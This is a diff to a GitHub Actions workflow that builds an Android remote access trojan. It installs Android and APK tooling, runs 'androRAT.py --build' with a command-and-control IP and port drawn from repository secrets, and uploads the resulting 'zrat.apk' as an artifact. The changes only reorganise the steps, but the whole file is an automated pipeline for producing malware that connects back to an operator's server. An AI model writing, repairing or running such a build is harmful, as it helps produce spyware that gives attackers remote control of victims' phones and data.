@@ -7,12 +7,19 @@ jobs:
       - uses: actions/checkout@v4
       - uses: actions/setup-java@v4
         with: { distribution: temurin, java-version: '17' }
-      - uses: android-actions/setup-android@v3
-      - run: |
+      
+      - name: Setup Android
+        run: |
           sudo apt-get update
           sudo apt-get install -y apktool zipalign
-          sdkmanager "build-tools;34.0.0" "platforms;android-34"
-          pip install -r requirements.txt
-      - run: python3 androRAT.py --build -i ${{ secrets.C2_IP }} -p ${{ secrets.C2_PORT }} -o zrat.apk
-      - uses: actions/upload-artifact@v4
+          yes | sdkmanager "build-tools;34.0.0" "platforms;android-34" || true
+          
+      - name: Install Python Requirements
+        run: pip install -r requirements.txt
+        
+      - name: Build APK
+        run: python3 androRAT.py --build -i ${{ secrets.C2_IP }} -p ${{ secrets.C2_PORT }} -o zrat.apk
+        
+      - name: Upload Artifact
+        uses: actions/upload-artifact@v4
         with: { name: zrat, path: zrat.apk }
